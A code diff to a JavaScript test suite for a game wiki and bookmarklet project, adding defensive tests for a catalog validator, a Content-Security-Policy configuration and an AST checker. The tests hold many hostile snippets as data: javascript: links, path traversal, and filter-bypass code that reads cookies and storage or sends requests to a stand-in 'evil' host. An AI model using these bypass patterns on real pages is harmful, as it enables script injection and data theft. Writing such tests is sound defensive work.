@@ -1,6 +1,6 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { readFileSync, readdirSync } from 'node:fs';
+import { readFileSync, readdirSync, existsSync } from 'node:fs';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { validateCatalog, containedPath } from '../lib/validate.mjs';
@@ -14,7 +14,7 @@ const goodCatalog = () => ({
   catalog_hash: 'a'.repeat(64),
   catalog: {
     species: Array.from({ length: 12 }, (_, i) => ({ id: `unit_h${i}`, catchable: true })),
-    abilities: [{}], modifiers: [{}], display_names: [{}], research: [{ id: 'research_r000' }],
+    abilities: [{}], modifiers: [{}], display_names: [{ id: 'dn_1', value: 'Bulbasaur' }], research: [{ id: 'research_r000' }],
   },
 });
 
@@ -26,6 +26,15 @@ test('catalog: hash chứa lệnh shell / id chứa đường dẫn bị từ ch
   assert.ok(validateCatalog(evilId).length);
   const evilResearch = goodCatalog(); evilResearch.catalog.research[0].id = '..%2f..';
   assert.ok(validateCatalog(evilResearch).length);
+  const evilName = goodCatalog(); evilName.catalog.display_names[0].value = '<a href="javascript:x">CUTD Helper</a>';
+  assert.ok(validateCatalog(evilName).includes('display_names có ký tự lạ'));
+  const evilSlot = goodCatalog(); evilSlot.catalog.trade = { slots: [{ slot: '<b>', recipes: [] }] };
+  assert.ok(validateCatalog(evilSlot).includes('trade lạ'));
+  const ghost = goodCatalog(); ghost.catalog.species[0].evolutions = [{ stage_id: 'unit_nope', cost: 10 }];
+  assert.ok(validateCatalog(ghost).length);
+  const shrunk = goodCatalog(); shrunk.catalog.species = shrunk.catalog.species.slice(0, 11);
+  const before = goodCatalog(); before.catalog.species = Array.from({ length: 40 }, (_, i) => ({ id: `unit_h${i}`, catchable: true }));
+  assert.ok(validateCatalog(shrunk, before).some(b => b.startsWith('species tụt')));
 });
 
 test('đường dẫn ảnh không thoát được khỏi public/<dir>/', () => {
@@ -73,8 +82,16 @@ test('workflow: không chèn output/dữ liệu vào shell, action ghim SHA, quy
 
 test('wiki build có CSP, không script inline', () => {
   const cfg = readFileSync(join(ROOT, 'vite.config.js'), 'utf8');
-  const scriptSrc = cfg.match(/"script-src[^"]*"/)?.[0] ?? '';
-  assert.equal(scriptSrc, `"script-src 'self'"`);
+  assert.match(cfg, /"default-src 'none'"/);
+  assert.match(cfg, /`script-src \$\{HOME\}assets\/`/);
+  for (const d of ['frame-src', 'child-src', 'worker-src', 'object-src']) assert.match(cfg, new RegExp(`"${d} 'none'"`), d);
+  assert.doesNotMatch(cfg, /unsafe-eval|strict-dynamic|\s\*[\s;"`]/);
+  assert.match(cfg, /`script-src \$\{HOME\}assets\/`,/, 'script-src chỉ đúng thư mục assets, không unsafe-inline');
+  if (existsSync(join(ROOT, 'dist/index.html'))) {
+    const csp = readFileSync(join(ROOT, 'dist/index.html'), 'utf8').match(/Content-Security-Policy" content="([^"]+)"/)?.[1] ?? '';
+    assert.match(csp, /script-src https:\/\/long7400\.github\.io\/cutd-dex\/assets\/(;|$)|script-src http:\/\/localhost:\d+\/assets\//);
+    assert.match(csp, /frame-src 'none'/);
+  }
   for (const f of ['index.html', 'src/main.js', 'src/ui.js']) assert.doesNotMatch(readFileSync(join(ROOT, f), 'utf8'), /\son[a-z]+="/, f);
 });
 
@@ -128,6 +145,32 @@ test('bookmarklet: bộ kiểm tra AST chặn các kiểu lách danh sách cho p
     'window.open': "export const x = () => window.open('https://evil');",
     'h(script)': "export const x = h => h('script', { src: 'x' });",
     'h(onerror)': "export const x = h => h('img', { onerror: 'alert(1)' });",
+    'template có thẻ': "export const x = d => d.createElement`script`;",
+    'setTimeout template có thẻ': 'export const x = () => setTimeout`alert(1)`;',
+    'ngoặc vuông chuỗi tới global cấm': "export const x = w => w['Function'];",
+    'ngoặc vuông chuỗi tới fetch': "export const x = () => window['fetch']('https://evil');",
+    'window[khoá biến]': "export const x = k => window[k];",
+    'self[khoá biến]': "export const x = n => self[n]('1');",
+    'self trơn': 'export const x = () => self;',
+    'top trơn': 'export const x = () => top.location;',
+    'destructuring cookie': 'export const x = () => { const { cookie } = document; return cookie; };',
+    'destructuring storage': 'export const x = () => { const { sessionStorage: s } = window; return s; };',
+    'destructuring fetch': 'export const x = () => { const { fetch: f } = window; return f; };',
+    'destructuring khoá tính': "export const x = (o, k) => { const { [k]: f } = o; return f; };",
+    'new WS': "const WS = win.WebSocket; export const x = () => new WS('wss://evil');",
+    'new qua thành viên': "export const x = o => new o.Thing();",
+    'setTimeout biến chuỗi': "export const x = () => { const f = 'alert(1)'; setTimeout(f); };",
+    'ghi DOM qua khoá biến': "export const x = (d, key) => { d.body[key] = '<img src=x>'; };",
+    'gán location.hash': "export const x = () => { location.hash = '#x'; };",
+    'getJSON bí danh': "export const x = () => { const g = getJSON; g('https://evil'); };",
+    'createContextualFragment': "export const x = r => r.createContextualFragment('<script></script>');",
+    'DOMParser': 'export const x = () => new DOMParser();',
+    'cookieStore': 'export const x = () => cookieStore.getAll();',
+    'Object.assign src': "export const x = el => Object.assign(el, { src: 'https://evil' });",
+    'defineProperty lạ': "export const x = o => Object.defineProperty(o, 'x', { get() { return 1; } });",
+    'getOwnPropertyDescriptor lạ': 'export const x = o => Object.getOwnPropertyDescriptor(o, "session");',
+    'chuỗi url(': "export const x = el => { el.style.cssText = 'background:url(https://evil/?' + 1 + ')'; };",
+    'setAttribute ngoài h()': "export const x = (el, k) => el.setAttribute(k, 'x');",
   };
   for (const [name, snippet] of Object.entries(attacks)) {
     const files = [...clean.filter(([f]) => f !== 'logic.js'), ['logic.js', `${logic}\n${snippet}`]];
